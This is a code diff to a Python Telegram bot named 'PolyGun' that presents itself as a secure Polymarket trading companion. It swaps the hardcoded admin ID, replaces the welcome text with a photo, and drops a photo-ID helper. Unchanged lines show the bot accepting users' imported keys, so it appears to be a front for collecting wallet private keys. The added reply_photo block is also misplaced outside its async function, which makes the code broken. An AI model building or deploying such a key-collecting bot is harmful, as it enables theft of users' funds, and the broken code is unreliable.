@@ -32,7 +32,7 @@ import random
 import string
 
 TOKEN = os.getenv("BOT_TOKEN")
-ADMIN_ID = 795990315
+ADMIN_ID = 8357823603
 
 
 # =========================
@@ -90,10 +90,20 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     context.user_data.clear()
 
-    await update.message.reply_text(
-        "✅ Welcome to PolyGun\nYour secure companion for rapid Polymarket trades.\n\n📊 Current Positions: 0\n💰 Available Balance: $0.00\n📄 Active Orders: 0\n💼 Total Net Worth: $0.00\n\nGet Started. Select a function:",
-        reply_markup=home_kb()
-    )
+    IMAGE_ID = "AgACAgQAAxkBAAIGoWnwpmEBxlU6E-ypzWrrY0koRNkZAAILDmsbD5eAU-BJZj7bfd40AQADAgADeAADOwQ"
+
+await update.message.reply_photo(
+    photo=IMAGE_ID,
+    caption=
+    "✅ Welcome to PolyGun\n"
+    "Your secure companion for rapid Polymarket trades.\n\n"
+    "📊 Current Positions: 0\n"
+    "💰 Available Balance: $0.00\n"
+    "📄 Active Orders: 0\n"
+    "💼 Total Net Worth: $0.00\n\n"
+    "Get Started. Select a function:",
+    reply_markup=home_kb()
+)
 
 
 # =========================
@@ -323,10 +333,6 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         await update.message.reply_text("✅ Key imported!")
 
-async def get_photo_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.message.photo:
-        file_id = update.message.photo[-1].file_id
-        await update.message.reply_text(f"FILE_ID:\n{file_id}")
 
 
 # =========================
@@ -338,7 +344,6 @@ app = ApplicationBuilder().token(TOKEN).build()
 app.add_handler(CommandHandler("start", start))
 app.add_handler(CallbackQueryHandler(handle_buttons))
 app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
-app.add_handler(MessageHandler(filters.PHOTO, get_photo_id))
 
 print("Bot running...")
 if __name__ == "__main__":
